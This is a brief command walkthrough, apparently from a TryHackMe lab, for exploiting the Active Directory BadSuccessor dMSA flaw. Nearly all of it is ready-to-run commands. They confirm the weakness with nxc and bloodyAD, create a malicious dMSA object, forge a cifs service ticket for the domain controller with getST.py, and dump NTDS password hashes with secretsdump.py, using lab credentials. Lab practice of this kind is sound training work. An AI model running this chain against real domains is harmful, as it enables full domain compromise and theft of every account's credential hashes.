**Confirm the BadSuccessor vulnerability**

```bash
nxc ldap DC-LAB2025-01.tryhackme.local -u tbyte -p 'P@SSw0rd345' -M badsuccessor  

bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable --detail  

bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable --detail | grep 'dSA: CREATE_CHILD'
```

Use Bloody to create a mDSA object, this will also create a Kerberos ticket.

```bash
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local add badSuccessor pentest2_dmsa
```

Use the Kerberos ticket

```bash
export KRB5CCNAME=./pentest2_dmsa_Zy.ccache 
```

Verify:

```bash
klist
```

Create Service Ticket targeting SPN

```bash
getST.py -dc-ip 10.211.101.10 -spn 'cifs/DC-LAB2025-01.tryhackme.local' 'tryhackme.local/pentest2_dmsa$' -k -no-pass
```

Export new Kerberos ticket

```bash
export KRB5CCNAME=./pentest2_dmsa\$@cifs_DC-LAB2025-01.tryhackme.local@TRYHACKME.LOCAL.ccache
```

Verify:

```bash
klist
```

Dump NTDS

```bash
secretsdump.py -k -no-pass 'pentest2_dmsa$@DC-LAB2025-01.tryhackme.local' -just-dc-ntlm
```